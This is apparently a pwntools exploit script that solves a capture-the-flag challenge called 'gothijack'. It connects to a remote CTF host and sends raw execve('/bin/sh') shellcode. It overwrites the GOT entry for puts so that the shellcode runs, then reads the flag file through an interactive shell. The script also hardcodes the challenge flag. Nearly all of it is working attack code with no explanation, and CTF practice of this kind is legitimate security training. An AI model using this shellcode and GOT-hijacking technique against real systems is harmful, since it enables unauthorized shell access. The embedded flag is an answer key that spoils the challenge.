#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{G0THiJJack1NG}

context.arch = 'amd64'

e = ELF('./gothijack-2586ada3c6815e1ad4656d704ecfc03f86bc1b00')

host , port = 'csie.ctf.tw' , 10129

y = remote(host,port)

sc = '\x48\x31\xf6\x48\x31\xd2\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x6a\x3b\x58\x0f\x05'

y.sendafter( ':' , '\x00' + sc )

y.sendafter( ':' , hex( e.got['puts'] ) )

y.sendafter( ':' , p64( 0x6010a1 ) )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()

